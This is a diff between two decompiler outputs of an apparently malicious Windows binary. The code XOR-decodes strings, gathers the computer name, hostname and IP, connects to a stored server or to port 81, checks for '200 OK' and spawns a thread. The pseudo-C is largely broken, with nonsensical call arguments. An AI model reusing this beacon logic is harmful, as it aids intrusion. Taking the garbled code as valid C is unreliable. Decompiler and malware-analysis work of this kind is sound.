-                v3 = v5;
-                v4 = v6;
-                // continue -> 0x4027b4
+              lab_0x4027a2:
+                // 0x4027a2
+                buf = v10;
+                sock = v9;
+                v6 = g8;
+                // branch -> 0x4027a2
                 continue;
             }
         }
-        int32_t v14 = v4 + 1; // 0x4027e9
+        int32_t v14 = (int32_t)buf + 1; // 0x4027e9
+        char * str = (char *)v14; // 0x4027e9
         if (v14 < 4) {
-            v11 = v14;
+            dwMilliseconds = str;
             goto lab_0x4027f2;
         }
         // 0x402802
-        *(char *)(g2 - 0x2007 + v1) = 0;
-        strstr((char *)&buf, "200 OK");
+        *(char *)((int32_t)&length - 0x2007 + v1) = 0;
+        *(int32_t *)(g8 - 4) = (int32_t)"200 OK";
+        *(int32_t *)(g8 - 8) = v4;
+        strstr(str, length);
+        v8 = g8 + 8;
         // branch -> 0x40282b
         // 0x40282b
-        g6 = v3;
-        g3 = v14;
+        g5 = *(int32_t *)v8;
+        g7 = *(int32_t *)(v8 + 4);
+        g3 = *(int32_t *)(v8 + 8);
+        g2 = (int32_t)length;
         return -1;
     }
-    // 0x40282b
-    g6 = v5;
-    g3 = v6;
-    return -1;
 }
 
-// Address range: 0x402830 - 0x402858
+// Address range: 0x402830 - 0x402859
 int32_t function_402830(int32_t a1, int32_t a2, char * a3, int32_t result) {
     // 0x402830
+    g6 = a2;
     *(int32_t *)result = a2;
     if (a2 < 1) {
         // 0x402858
@@ -2440,25 +3029,24 @@ int32_t function_402830(int32_t a1, int32_t a2, char * a3, int32_t result) {
     int32_t v1 = (int32_t)a3; // 0x40283e
     g4 = v1;
     int32_t result2 = a1 - v1; // 0x402847
-    unsigned char v2 = *(char *)(result2 + v1) ^ 35; // 0x40284e
-    *(char *)v1 = v2;
-    int32_t v3 = g4 + 1; // 0x402853
-    g4 = v3;
-    int32_t v4 = a2 - 1; // 0x402854
-    a2 = v4;
+    int32_t v2 = g6; // 0x402849
+    unsigned char v3 = *(char *)(result2 + v1) ^ 35; // 0x40284e
+    g6 = (int32_t)v3 | v2 & -256;
+    *(char *)v1 = v3;
+    int32_t v4 = g4 + 1; // 0x402853
+    g4 = v4;
     // 0x402857
     // branch -> 0x40284b
-    while (v4 != 0) {
+    while (v2 != 1) {
         // 0x40284b
         // 0x40284b
-        a2 = (int32_t)v2 | a2 & -256;
-        v1 = v3;
-        v2 = *(char *)(result2 + v1) ^ 35;
-        *(char *)v1 = v2;
-        v3 = g4 + 1;
-        g4 = v3;
-        v4 = a2 - 1;
-        a2 = v4;
+        v2 = g6;
+        v1 = v4;
+        v3 = *(char *)(result2 + v1) ^ 35;
+        g6 = (int32_t)v3 | v2 & -256;
+        *(char *)v1 = v3;
+        v4 = g4 + 1;
+        g4 = v4;
         // 0x402857
         // branch -> 0x40284b
     }
@@ -2466,44 +3054,61 @@ int32_t function_402830(int32_t a1, int32_t a2, char * a3, int32_t result) {
     return result2;
 }
 
-// Address range: 0x402859 - 0x4028cb
+// Address range: 0x402859 - 0x4028cc
 int32_t function_402859(void) {
     struct in_addr in; // 0x4028b0
     int32_t v1 = g2; // 0x402859
     int32_t nSize = 255; // bp-8
-    GetComputerNameA((char *)&g64, &nSize);
-    g65 = 0;
+    GetComputerNameA((char *)&g68, &nSize);
+    g69 = 0;
     int32_t name = 0; // bp-264
-    struct timeval * str;
+    char * str2; // bp-288
+    char * str; // bp-292
+    int32_t v2; // 0x4028b9
     char * dest_str; // 0x4028c3
     if (gethostname((char *)&name, 255) != 0) {
-        str = (struct timeval *)&g68;
+        // 0x4028b9
+        v2 = g8 - 4;
+        *(int32_t *)v2 = (int32_t)&g74;
+        // branch -> 0x4028be
         // 0x4028be
-        dest_str = strcpy((char *)&g63, (char *)str);
-        g4 = (int32_t)str;
+        *(int32_t *)(v2 - 4) = (int32_t)&g67;
+        dest_str = strcpy(str, str2);
+        g4 = *(int32_t *)(g8 + 4);
         g2 = v1;
         return (int32_t)dest_str;
     }
-    struct hostent * v2 = gethostbyname((char *)&name); // 0x40289f
-    if (v2 != NULL) {
-        int32_t v3 = *(int32_t *)((int32_t)v2 + 12); // 0x4028a9
-        in = (struct in_addr){
-            .e0 = 0
-        };
-        in.e0 = *(int32_t *)*(int32_t *)v3;
-        str = (struct timeval *)inet_ntoa(in);
+    struct hostent * v3 = gethostbyname((char *)&name); // 0x40289f
+    if (v3 == NULL) {
+        // 0x4028b9
+        v2 = g8 - 4;
+        *(int32_t *)v2 = (int32_t)&g74;
         // branch -> 0x4028be
-    } else {
-        str = (struct timeval *)&g68;
+        // 0x4028be
+        *(int32_t *)(v2 - 4) = (int32_t)&g67;
+        dest_str = strcpy(str, str2);
+        g4 = *(int32_t *)(g8 + 4);
+        g2 = v1;
+        return (int32_t)dest_str;
     }
+    int32_t v4 = *(int32_t *)((int32_t)v3 + 12); // 0x4028a9
+    int32_t str3 = *(int32_t *)*(int32_t *)v4; // 0x4028ae
+    in = (struct in_addr){
+        .e0 = 0
+    };
+    in.e0 = str3;
+    str = inet_ntoa(in);
+    int32_t v5 = (int32_t)&str; // 0x4028b6
+    // branch -> 0x4028be
     // 0x4028be
-    dest_str = strcpy((char *)&g63, (char *)str);
-    g4 = (int32_t)str;
+    *(int32_t *)(v5 - 4) = (int32_t)&g67;
+    dest_str = strcpy(str, (char *)str3);
+    g4 = *(int32_t *)(g8 + 4);
     g2 = v1;
     return (int32_t)dest_str;
 }
 
-// Address range: 0x4028cc - 0x4028ea
+// Address range: 0x4028cc - 0x4028eb
 int32_t function_4028cc(char * name, int32_t a2, int32_t a3, int32_t a4) {
     struct in_addr in; // 0x4028e1
     struct hostent * v1 = gethostbyname(name); // 0x4028d0
@@ -2519,106 +3124,154 @@ int32_t function_4028cc(char * name, int32_t a2, int32_t a3, int32_t a4) {
     return (int32_t)inet_ntoa(in);
 }
 
-// Address range: 0x4028eb - 0x402aa6
+// Address range: 0x4028eb - 0x402aa7
 int32_t function_4028eb(void) {
-    int32_t v1 = g3; // 0x4028f4
+    int32_t v1 = g2; // bp-4
+    g2 = &v1;
+    int16_t writefds; // bp-296
+    int32_t v2 = &writefds; // 0x4028ee
     g3 = -0x7ffffff6;
-    int32_t v2 = g6; // 0x4028fb
-    int32_t v3 = g5; // 0x4028fc
+    int32_t v3 = g5; // bp-308
     g5 = 0;
-    g6 = 1;
+    g7 = 1;
     int32_t timeout; // bp-16
-    struct timeval * writefds; // bp-296
-    int32_t addr; // bp-32
-    int32_t lpThreadId; // bp-36
-    struct timeval * v4; // bp-8
+    struct _SECURITY_ATTRIBUTES * lpThreadAttributes;
+    int16_t addr2; // bp-32
+    int32_t v4; // bp-36
+    int32_t v5; // bp-8
     int32_t result;
-    int32_t readfds; // 0x402a33
-    int32_t v5; // 0x402a5e
-    int32_t v6; // 0x402a6e
-    int32_t lpThreadAttributes; // 0x402a7f
-    int32_t v7; // 0x402a3d
-    int32_t * threadHandle; // 0x402a81
-    int32_t v8; // 0x402a81
-    int32_t v9; // 0x402a4d
-    int32_t v10; // 0x402a63
+    int32_t v6; // 0x402a1a
+    int32_t v7; // 0x402a5e
+    int32_t v8; // 0x402aa2
+    int32_t v9; // 0x4029b0
+    int32_t v10; // 0x4029ce
+    int32_t v11; // 0x402a2c
+    int32_t v12; // 0x402a4d
+    int32_t v13; // 0x402a77
+    int32_t v14; // 0x4029c8
+    int16_t v15; // 0x4029ff
+    int32_t sock; // 0x402a0e
+    int32_t v16; // 0x4029e9
+    int16_t host_short; // 0x4029f3
+    struct _SECURITY_ATTRIBUTES * v17; // 0x402a14
     int32_t sock_fd; // 0x4029b4
-    if (g52 != 0) {
-        // 0x4028eb
-        // branch -> 0x4029b0
+    int32_t v18; // 0x402a3d
+    int32_t * threadHandle; // 0x402a81
+    int32_t v19; // 0x402a81
+    int32_t * addr;
+    if (g54 != 0) {
+        v9 = &v3;
         // 0x4029b0
-        sock_fd = socket(AF_INET, SOCK_STREAM, IPPROTO_IP);
-        g34 = (struct fd_set *)sock_fd;
+        *(int32_t *)(v9 - 4) = 0;
+        *(int32_t *)(v9 - 8) = g7;
+        *(int32_t *)(v9 - 12) = 2;
+        struct fd_set * type;
+        struct fd_set * protocol;
+        sock_fd = socket(AF_UNSPEC, (int32_t)type, (int32_t)protocol);
+        g36 = (char *)sock_fd;
         if (sock_fd == -1) {
             // 0x402a9c
             // branch -> 0x402aa2
             // 0x402aa2
-            g5 = v3;
-            g6 = v2;
-            g3 = v1;
+            v8 = g8;
+            g5 = *(int32_t *)v8;
+            g7 = *(int32_t *)(v8 + 4);
+            g3 = *(int32_t *)(v8 + 8);
+            g2 = v1;
             return 0;
         }
         // 0x4029c8
-        v4 = (struct timeval *)g6;
-        ioctlsocket(sock_fd, -0x7ffb9982, (int32_t *)&v4);
+        v14 = &v5;
+        g4 = v14;
+        v5 = g7;
+        v10 = g8;
+        *(int32_t *)(v10 - 4) = v14;
+        *(int32_t *)(v10 - 8) = -0x7ffb9982;
+        *(int32_t *)(v10 - 12) = sock_fd;
+        ioctlsocket(v5, v1, (int32_t *)0);
         timeout = 60;
-        writefds = (struct timeval *)g6;
-        addr = 2;
-        htons(g58);
-        inet_addr((char *)&g57);
-        connect(*(int32_t *)&g34, (struct sockaddr *)&addr, 16);
-        readfds = g5;
-        v7 = select((int32_t)g34 + 1, (struct fd_set *)(int32_t (*)(int32_t *))readfds, (struct fd_set *)&writefds, (struct fd_set *)readfds, (struct timeval *)&timeout);
-        if (v7 < 1) {
+        v16 = (int32_t)g61 | (int32_t)g36 & -0x10000;
+        *(int32_t *)(g8 - 4) = v16;
+        host_short = g7;
+        writefds = host_short;
+        addr2 = 2;
+        v15 = htons(host_short);
+        *(int32_t *)(g8 - 4) = (int32_t)&g60;
+        sock = inet_addr((char *)((int32_t)v15 & 0xffff));
+        v17 = (struct _SECURITY_ATTRIBUTES *)sock;
+        v6 = g8;
+        *(int32_t *)(v6 - 4) = 16;
+        *(int32_t *)(v6 - 8) = (int32_t)&addr2;
+        *(int32_t *)(v6 - 12) = (int32_t)g36;
+        connect(sock, (struct sockaddr *)&addr, (int32_t)&addr);
+        v11 = g8;
+        *(int32_t *)(v11 - 4) = (int32_t)&timeout;
+        *(int32_t *)(v11 - 8) = g5;
+        *(int32_t *)(v11 - 12) = v2;
+        *(int32_t *)(v11 - 16) = g5;
+        *(int32_t *)(v11 - 20) = (int32_t)g36 + 1;
+        v18 = select(sock, (struct fd_set *)&addr, (struct fd_set *)&addr, (struct fd_set *)&addr, (struct timeval *)&addr);
+        if (v18 < 1) {
             // 0x402a90
-            closesocket((int32_t)g34);
+            *(int32_t *)(g8 - 4) = (int32_t)g36;
+            closesocket((int32_t)v17);
             // branch -> 0x402a9c
             // 0x402a9c
             // branch -> 0x402aa2
             // 0x402aa2
-            g5 = v3;
-            g6 = v2;
-            g3 = v1;
+            v8 = g8;
+            g5 = *(int32_t *)v8;
+            g7 = *(int32_t *)(v8 + 4);
+            g3 = *(int32_t *)(v8 + 8);
+            g2 = v1;
             return 0;
         }
         // 0x402a47
-        g53 = (struct timeval *)g6;
+        g56 = g7;
+        lpThreadAttributes = v17;
         // branch -> 0x402a4d
         // 0x402a4d
-        v9 = g5;
-        v10 = v9;
-        if (g52 != v9) {
+        v12 = g5;
+        if (g54 != v12) {
             // 0x402a5e
-            v5 = g67;
-            lpThreadAttributes = v10;
-            if (v5 != v10) {
+            v7 = g72;
+            if (v7 != v12) {
                 // 0x402a67
-                CloseHandle(&((struct timeval *)v5)->e0);
-                v6 = g5;
-                g67 = v6;
-                lpThreadAttributes = v6;
+                *(int32_t *)(g8 - 4) = v7;
+                CloseHandle(&lpThreadAttributes->e0);
+                g72 = g5;
                 // branch -> 0x402a74
             }
             // 0x402a74
-            threadHandle = CreateThread((struct _SECURITY_ATTRIBUTES *)lpThreadAttributes, lpThreadAttributes, (int32_t (*)(int32_t *))0x402d8f, &((struct fd_set *)lpThreadAttributes)->e0, lpThreadAttributes, &lpThreadId);
-            v8 = (int32_t)threadHandle;
-            g67 = v8;
-            if (v8 != g5) {
+            v13 = g8;
+            *(int32_t *)(v13 - 4) = (int32_t)&v4;
+            *(int32_t *)(v13 - 8) = g5;
+            *(int32_t *)(v13 - 12) = g5;
+            *(int32_t *)(v13 - 16) = 0x402d8f;
+            *(int32_t *)(v13 - 20) = g5;
+            *(int32_t *)(v13 - 24) = g5;
+            threadHandle = CreateThread(lpThreadAttributes, (int32_t)&addr, (int32_t (*)(int32_t *))&addr, &addr, (int32_t)&addr, &addr);
+            v19 = (int32_t)threadHandle;
+            g72 = v19;
+            if (v19 != g5) {
                 // 0x402aa0
-                result = g6;
+                result = g7;
                 // branch -> 0x402aa2
             } else {
                 // 0x402a90
-                closesocket((int32_t)g34);
+                *(int32_t *)(g8 - 4) = (int32_t)g36;
+                closesocket((int32_t)lpThreadAttributes);
                 // branch -> 0x402a9c
                 // 0x402a9c
                 result = 0;
                 // branch -> 0x402aa2
             }
             // 0x402aa2
-            g5 = v3;
-            g6 = v2;
-            g3 = v1;
+            v8 = g8;
+            g5 = *(int32_t *)v8;
+            g7 = *(int32_t *)(v8 + 4);
+            g3 = *(int32_t *)(v8 + 8);
+            g2 = v1;
             return result;
         }
         // 0x402a55
@@ -2626,107 +3279,127 @@ int32_t function_4028eb(void) {
             // 0x402a9c
             // branch -> 0x402aa2
             // 0x402aa2
-            g5 = v3;
-            g6 = v2;
-            g3 = v1;
+            v8 = g8;
+            g5 = *(int32_t *)v8;
+            g7 = *(int32_t *)(v8 + 4);
+            g3 = *(int32_t *)(v8 + 8);
+            g2 = v1;
             return 0;
         }
         // 0x402a55
-        v10 = g5;
         // branch -> 0x402a5e
         // 0x402a5e
-        v5 = g67;
-        lpThreadAttributes = v10;
-        if (v5 != v10) {
+        v7 = g72;
+        if (v7 != g5) {
             // 0x402a67
-            CloseHandle(&((struct timeval *)v5)->e0);
-            v6 = g5;
-            g67 = v6;
-            lpThreadAttributes = v6;
+            *(int32_t *)(g8 - 4) = v7;
+            CloseHandle(&lpThreadAttributes->e0);
+            g72 = g5;
             // branch -> 0x402a74
         }
         // 0x402a74
-        lpThreadId = 0;
-        threadHandle = CreateThread((struct _SECURITY_ATTRIBUTES *)lpThreadAttributes, lpThreadAttributes, (int32_t (*)(int32_t *))0x402d8f, &((struct fd_set *)lpThreadAttributes)->e0, lpThreadAttributes, &lpThreadId);
-        v8 = (int32_t)threadHandle;
-        g67 = v8;
-        if (v8 != g5) {
+        v13 = g8;
+        *(int32_t *)(v13 - 4) = (int32_t)&v4;
+        *(int32_t *)(v13 - 8) = g5;
+        *(int32_t *)(v13 - 12) = g5;
+        *(int32_t *)(v13 - 16) = 0x402d8f;
+        *(int32_t *)(v13 - 20) = g5;
+        *(int32_t *)(v13 - 24) = g5;
+        threadHandle = CreateThread(lpThreadAttributes, (int32_t)&addr, (int32_t (*)(int32_t *))&addr, &addr, (int32_t)&addr, &addr);
+        v19 = (int32_t)threadHandle;
+        g72 = v19;
+        if (v19 != g5) {
             // 0x402aa0
-            result = g6;
+            result = g7;
             // branch -> 0x402aa2
         } else {
             // 0x402a90
-            closesocket((int32_t)g34);
+            *(int32_t *)(g8 - 4) = (int32_t)g36;
+            closesocket((int32_t)lpThreadAttributes);
             // branch -> 0x402a9c
             // 0x402a9c
             result = 0;
             // branch -> 0x402aa2
         }
         // 0x402aa2
-        g5 = v3;
-        g6 = v2;
-        g3 = v1;
+        v8 = g8;
+        g5 = *(int32_t *)v8;
+        g7 = *(int32_t *)(v8 + 4);
+        g3 = *(int32_t *)(v8 + 8);
+        g2 = v1;
         return result;
     }
     // 0x40290e
-    g53 = NULL;
+    g56 = 0;
     int32_t sock_fd2 = socket(AF_INET, SOCK_STREAM, IPPROTO_IP); // 0x402918
-    g34 = (struct fd_set *)sock_fd2;
+    g36 = (char *)sock_fd2;
     if (sock_fd2 == -1) {
         // 0x402a9c
         // branch -> 0x402aa2
         // 0x402aa2
-        g5 = v3;
-        g6 = v2;
-        g3 = v1;
+        v8 = g8;
+        g5 = *(int32_t *)v8;
+        g7 = *(int32_t *)(v8 + 4);
+        g3 = *(int32_t *)(v8 + 8);
+        g2 = v1;
         return 0;
     }
     // 0x40292c
-    v4 = (struct timeval *)g6;
-    ioctlsocket(sock_fd2, -0x7ffb9982, (int32_t *)&v4);
+    g4 = &v5;
+    v5 = g7;
+    ioctlsocket(sock_fd2, -0x7ffb9982, &v5);
     timeout = 60;
-    writefds = (struct timeval *)g6;
-    addr = 2;
+    writefds = g7;
+    addr2 = 2;
     htons(81);
-    connect(*(int32_t *)&g34, (struct sockaddr *)&addr, 16);
-    int32_t readfds2 = g5; // 0x40298c
-    int32_t v11 = select((int32_t)g34 + 1, (struct fd_set *)(int32_t (*)(int32_t *))readfds2, (struct fd_set *)&writefds, (struct fd_set *)readfds2, (struct timeval *)&timeout); // 0x402996
-    if (v11 >= 1) {
+    connect(*(int32_t *)&g36, (struct sockaddr *)&addr2, 16);
+    struct fd_set * readfds = (struct fd_set *)g5; // 0x40298c
+    int32_t nfds = (int32_t)g36 + 1; // 0x402994
+    int32_t v20 = select(nfds, readfds, (struct fd_set *)&writefds, readfds, (struct timeval *)&timeout); // 0x402996
+    if (v20 >= 0 == (v20 != 0)) {
+        lpThreadAttributes = g39;
         // 0x402a4d
-        v9 = g5;
-        v10 = v9;
-        if (g52 != v9) {
+        v12 = g5;
+        if (g54 != v12) {
             // 0x402a5e
-            v5 = g67;
-            lpThreadAttributes = v10;
-            if (v5 != v10) {
+            v7 = g72;
+            if (v7 != v12) {
                 // 0x402a67
-                CloseHandle(&((struct timeval *)v5)->e0);
-                v6 = g5;
-                g67 = v6;
-                lpThreadAttributes = v6;
+                *(int32_t *)(g8 - 4) = v7;
+                CloseHandle(&lpThreadAttributes->e0);
+                g72 = g5;
                 // branch -> 0x402a74
             }
             // 0x402a74
-            threadHandle = CreateThread((struct _SECURITY_ATTRIBUTES *)lpThreadAttributes, lpThreadAttributes, (int32_t (*)(int32_t *))0x402d8f, &((struct fd_set *)lpThreadAttributes)->e0, lpThreadAttributes, &lpThreadId);
-            v8 = (int32_t)threadHandle;
-            g67 = v8;
-            if (v8 != g5) {
+            v13 = g8;
+            *(int32_t *)(v13 - 4) = (int32_t)&v4;
+            *(int32_t *)(v13 - 8) = g5;
+            *(int32_t *)(v13 - 12) = g5;
+            *(int32_t *)(v13 - 16) = 0x402d8f;
+            *(int32_t *)(v13 - 20) = g5;
+            *(int32_t *)(v13 - 24) = g5;
+            threadHandle = CreateThread(lpThreadAttributes, (int32_t)&addr, (int32_t (*)(int32_t *))&addr, &addr, (int32_t)&addr, &addr);
+            v19 = (int32_t)threadHandle;
+            g72 = v19;
+            if (v19 != g5) {
                 // 0x402aa0
-                result = g6;
+                result = g7;
                 // branch -> 0x402aa2
             } else {
                 // 0x402a90
-                closesocket((int32_t)g34);
+                *(int32_t *)(g8 - 4) = (int32_t)g36;
+                closesocket((int32_t)lpThreadAttributes);
                 // branch -> 0x402a9c
                 // 0x402a9c
                 result = 0;
                 // branch -> 0x402aa2
             }
             // 0x402aa2
-            g5 = v3;
-            g6 = v2;
-            g3 = v1;
+            v8 = g8;
+            g5 = *(int32_t *)v8;
+            g7 = *(int32_t *)(v8 + 4);
+            g3 = *(int32_t *)(v8 + 8);
+            g2 = v1;
             return result;
         }
         // 0x402a55
@@ -2734,116 +3407,161 @@ int32_t function_4028eb(void) {
             // 0x402a9c
             // branch -> 0x402aa2
             // 0x402aa2
-            g5 = v3;
-            g6 = v2;
-            g3 = v1;
+            v8 = g8;
+            g5 = *(int32_t *)v8;
+            g7 = *(int32_t *)(v8 + 4);
+            g3 = *(int32_t *)(v8 + 8);
+            g2 = v1;
             return 0;
         }
         // 0x402a55
-        v10 = g5;
         // branch -> 0x402a5e
         // 0x402a5e
-        v5 = g67;
-        lpThreadAttributes = v10;
-        if (v5 != v10) {
+        v7 = g72;
+        if (v7 != g5) {
             // 0x402a67
-            CloseHandle(&((struct timeval *)v5)->e0);
-            v6 = g5;
-            g67 = v6;
-            lpThreadAttributes = v6;
+            *(int32_t *)(g8 - 4) = v7;
+            CloseHandle(&lpThreadAttributes->e0);
+            g72 = g5;
             // branch -> 0x402a74
         }
         // 0x402a74
-        threadHandle = CreateThread((struct _SECURITY_ATTRIBUTES *)lpThreadAttributes, lpThreadAttributes, (int32_t (*)(int32_t *))0x402d8f, &((struct fd_set *)lpThreadAttributes)->e0, lpThreadAttributes, &lpThreadId);
-        v8 = (int32_t)threadHandle;
-        g67 = v8;
-        if (v8 != g5) {
+        v13 = g8;
+        *(int32_t *)(v13 - 4) = (int32_t)&v4;
+        *(int32_t *)(v13 - 8) = g5;
+        *(int32_t *)(v13 - 12) = g5;
+        *(int32_t *)(v13 - 16) = 0x402d8f;
+        *(int32_t *)(v13 - 20) = g5;
+        *(int32_t *)(v13 - 24) = g5;
+        threadHandle = CreateThread(lpThreadAttributes, (int32_t)&addr, (int32_t (*)(int32_t *))&addr, &addr, (int32_t)&addr, &addr);
+        v19 = (int32_t)threadHandle;
+        g72 = v19;
+        if (v19 != g5) {
             // 0x402aa0
-            result = g6;
+            result = g7;
             // branch -> 0x402aa2
         } else {
             // 0x402a90
-            closesocket((int32_t)g34);
+            *(int32_t *)(g8 - 4) = (int32_t)g36;
+            closesocket((int32_t)lpThreadAttributes);
             // branch -> 0x402a9c
             // 0x402a9c
             result = 0;
             // branch -> 0x402aa2
         }
         // 0x402aa2
-        g5 = v3;
-        g6 = v2;
-        g3 = v1;
+        v8 = g8;
+        g5 = *(int32_t *)v8;
+        g7 = *(int32_t *)(v8 + 4);
+        g3 = *(int32_t *)(v8 + 8);
+        g2 = v1;
         return result;
     }
-    int32_t protocol = g5; // 0x4029a4
-    if ((int32_t)g59 != protocol) {
-        // 0x4029a4
+    int32_t v21 = g5; // 0x4029a4
+    if ((int32_t)g62 != v21) {
+        struct fd_set * protocol2 = (struct fd_set *)&writefds;
+        v9 = g8;
         // branch -> 0x4029b0
         // 0x4029b0
-        sock_fd = socket(AF_INET, g6, protocol);
-        g34 = (struct fd_set *)sock_fd;
+        *(int32_t *)(v9 - 4) = v21;
+        *(int32_t *)(v9 - 8) = g7;
+        *(int32_t *)(v9 - 12) = 2;
+        sock_fd = socket((int32_t)(char *)nfds, (int32_t)readfds, (int32_t)protocol2);
+        g36 = (char *)sock_fd;
         if (sock_fd != -1) {
             // 0x4029c8
-            v4 = (struct timeval *)g6;
-            ioctlsocket(sock_fd, -0x7ffb9982, (int32_t *)&v4);
+            v14 = &v5;
+            g4 = v14;
+            v5 = g7;
+            v10 = g8;
+            *(int32_t *)(v10 - 4) = v14;
+            *(int32_t *)(v10 - 8) = -0x7ffb9982;
+            *(int32_t *)(v10 - 12) = sock_fd;
+            int32_t v22;
+            ioctlsocket(v5, v1, (int32_t *)v22);
             timeout = 60;
-            writefds = (struct timeval *)g6;
-            addr = 2;
-            htons(g58);
-            inet_addr((char *)&g57);
-            connect(*(int32_t *)&g34, (struct sockaddr *)&addr, 16);
-            readfds = g5;
-            v7 = select((int32_t)g34 + 1, (struct fd_set *)(int32_t (*)(int32_t *))readfds, (struct fd_set *)&writefds, (struct fd_set *)readfds, (struct timeval *)&timeout);
-            if (v7 < 1) {
+            v16 = (int32_t)g61 | (int32_t)g36 & -0x10000;
+            *(int32_t *)(g8 - 4) = v16;
+            host_short = g7;
+            writefds = host_short;
+            addr2 = 2;
+            v15 = htons(host_short);
+            *(int32_t *)(g8 - 4) = (int32_t)&g60;
+            sock = inet_addr((char *)((int32_t)v15 & 0xffff));
+            v17 = (struct _SECURITY_ATTRIBUTES *)sock;
+            v6 = g8;
+            *(int32_t *)(v6 - 4) = 16;
+            *(int32_t *)(v6 - 8) = (int32_t)&addr2;
+            *(int32_t *)(v6 - 12) = (int32_t)g36;
+            connect(sock, (struct sockaddr *)&addr, (int32_t)&addr);
+            v11 = g8;
+            *(int32_t *)(v11 - 4) = (int32_t)&timeout;
+            *(int32_t *)(v11 - 8) = g5;
+            *(int32_t *)(v11 - 12) = v2;
+            *(int32_t *)(v11 - 16) = g5;
+            *(int32_t *)(v11 - 20) = (int32_t)g36 + 1;
+            v18 = select(sock, (struct fd_set *)&addr, (struct fd_set *)&addr, (struct fd_set *)&addr, (struct timeval *)&addr);
+            if (v18 < 1) {
                 // 0x402a90
-                closesocket((int32_t)g34);
+                *(int32_t *)(g8 - 4) = (int32_t)g36;
+                closesocket((int32_t)v17);
                 // branch -> 0x402a9c
                 // 0x402a9c
                 // branch -> 0x402aa2
                 // 0x402aa2
-                g5 = v3;
-                g6 = v2;
-                g3 = v1;
+                v8 = g8;
+                g5 = *(int32_t *)v8;
+                g7 = *(int32_t *)(v8 + 4);
+                g3 = *(int32_t *)(v8 + 8);
+                g2 = v1;
                 return 0;
             }
             // 0x402a47
-            g53 = (struct timeval *)g6;
+            g56 = g7;
+            lpThreadAttributes = v17;
             // branch -> 0x402a4d
             // 0x402a4d
-            v9 = g5;
-            v10 = v9;
-            if (g52 != v9) {
+            v12 = g5;
+            if (g54 != v12) {
                 // 0x402a5e
-                v5 = g67;
-                lpThreadAttributes = v10;
-                if (v5 != v10) {
+                v7 = g72;
+                if (v7 != v12) {
                     // 0x402a67
-                    CloseHandle(&((struct timeval *)v5)->e0);
-                    v6 = g5;
-                    g67 = v6;
-                    lpThreadAttributes = v6;
+                    *(int32_t *)(g8 - 4) = v7;
+                    CloseHandle(&lpThreadAttributes->e0);
+                    g72 = g5;
                     // branch -> 0x402a74
                 }
                 // 0x402a74
-                threadHandle = CreateThread((struct _SECURITY_ATTRIBUTES *)lpThreadAttributes, lpThreadAttributes, (int32_t (*)(int32_t *))0x402d8f, &((struct fd_set *)lpThreadAttributes)->e0, lpThreadAttributes, &lpThreadId);
-                v8 = (int32_t)threadHandle;
-                g67 = v8;
-                if (v8 != g5) {
+                v13 = g8;
+                *(int32_t *)(v13 - 4) = (int32_t)&v4;
+                *(int32_t *)(v13 - 8) = g5;
+                *(int32_t *)(v13 - 12) = g5;
+                *(int32_t *)(v13 - 16) = 0x402d8f;
+                *(int32_t *)(v13 - 20) = g5;
+                *(int32_t *)(v13 - 24) = g5;
+                threadHandle = CreateThread(lpThreadAttributes, (int32_t)&addr, (int32_t (*)(int32_t *))&addr, &addr, (int32_t)&addr, &addr);
+                v19 = (int32_t)threadHandle;
+                g72 = v19;
+                if (v19 != g5) {
                     // 0x402aa0
-                    result = g6;
+                    result = g7;
                     // branch -> 0x402aa2
                 } else {
                     // 0x402a90
-                    closesocket((int32_t)g34);
+                    *(int32_t *)(g8 - 4) = (int32_t)g36;
+                    closesocket((int32_t)lpThreadAttributes);
                     // branch -> 0x402a9c
                     // 0x402a9c
                     result = 0;
                     // branch -> 0x402aa2
                 }
                 // 0x402aa2
-                g5 = v3;
-                g6 = v2;
-                g3 = v1;
+                v8 = g8;
+                g5 = *(int32_t *)v8;
+                g7 = *(int32_t *)(v8 + 4);
+                g3 = *(int32_t *)(v8 + 8);
+                g2 = v1;
                 return result;
             }
             // 0x402a55
@@ -2851,517 +3569,918 @@ int32_t function_4028eb(void) {
                 // 0x402a9c
                 // branch -> 0x402aa2
                 // 0x402aa2
-                g5 = v3;
-                g6 = v2;
-                g3 = v1;
+                v8 = g8;
+                g5 = *(int32_t *)v8;
+                g7 = *(int32_t *)(v8 + 4);
+                g3 = *(int32_t *)(v8 + 8);
+                g2 = v1;
                 return 0;
             }
             // 0x402a55
-            v10 = g5;
             // branch -> 0x402a5e
             // 0x402a5e
-            v5 = g67;
-            lpThreadAttributes = v10;
-            if (v5 != v10) {
+            v7 = g72;
+            if (v7 != g5) {
                 // 0x402a67
-                CloseHandle(&((struct timeval *)v5)->e0);
-                v6 = g5;
-                g67 = v6;
-                lpThreadAttributes = v6;
+                *(int32_t *)(g8 - 4) = v7;
+                CloseHandle(&lpThreadAttributes->e0);
+                g72 = g5;
                 // branch -> 0x402a74
             }
             // 0x402a74
-            threadHandle = CreateThread((struct _SECURITY_ATTRIBUTES *)lpThreadAttributes, lpThreadAttributes, (int32_t (*)(int32_t *))0x402d8f, &((struct fd_set *)lpThreadAttributes)->e0, lpThreadAttributes, &lpThreadId);
-            v8 = (int32_t)threadHandle;
-            g67 = v8;
-            if (v8 != g5) {
+            v13 = g8;
+            *(int32_t *)(v13 - 4) = (int32_t)&v4;
+            *(int32_t *)(v13 - 8) = g5;
+            *(int32_t *)(v13 - 12) = g5;
+            *(int32_t *)(v13 - 16) = 0x402d8f;
+            *(int32_t *)(v13 - 20) = g5;
+            *(int32_t *)(v13 - 24) = g5;
+            threadHandle = CreateThread(lpThreadAttributes, (int32_t)&addr, (int32_t (*)(int32_t *))&addr, &addr, (int32_t)&addr, &addr);
+            v19 = (int32_t)threadHandle;
+            g72 = v19;
+            if (v19 != g5) {
                 // 0x402aa0
-                result = g6;
+                result = g7;
                 // branch -> 0x402aa2
             } else {
                 // 0x402a90
-                closesocket((int32_t)g34);
+                *(int32_t *)(g8 - 4) = (int32_t)g36;
+                closesocket((int32_t)lpThreadAttributes);
                 // branch -> 0x402a9c
                 // 0x402a9c
                 result = 0;
                 // branch -> 0x402aa2
             }
             // 0x402aa2
-            g5 = v3;
-            g6 = v2;
-            g3 = v1;
+            v8 = g8;
+            g5 = *(int32_t *)v8;
+            g7 = *(int32_t *)(v8 + 4);
+            g3 = *(int32_t *)(v8 + 8);
+            g2 = v1;
             return result;
         }
     }
     // 0x402a9c
     // branch -> 0x402aa2
     // 0x402aa2
-    g5 = v3;
-    g6 = v2;
-    g3 = v1;
+    v8 = g8;
+    g5 = *(int32_t *)v8;
+    g7 = *(int32_t *)(v8 + 4);
+    g3 = *(int32_t *)(v8 + 8);
+    g2 = v1;
     return 0;
 }
 
